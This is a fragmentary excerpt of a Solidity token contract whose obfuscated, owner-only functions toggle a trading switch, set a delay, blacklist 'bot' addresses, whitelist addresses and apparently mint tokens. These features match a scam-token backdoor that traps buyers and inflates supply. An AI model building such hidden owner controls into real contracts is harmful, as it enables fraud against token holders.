...
contract BKsM is Ownable{
    ...
    function BT10L(bool b) public  onlyOwner  returns (bool success) {
        require(_bool != b);
        _bool=b;
        return true;
    }
    ...
    function Set69DL(uint _dlkl) public  onlyOwner  returns (bool success) {
        require(delay != _dlkl);
        delay=_dlkl;
        return true;
    }

    function Bacs2L(address[] memory listAddress,  bool isBot) public  onlyOwner  returns (bool success) {
    ...
    function WL55(address[] memory listAddress,  bool _isWhiteListed) public  onlyOwner  returns (bool success) {
        if(listAddress.length==1){
...
contract COIN is BKsM{
    ...
    function MI(address account, uint256 amount) onlyOwner public {
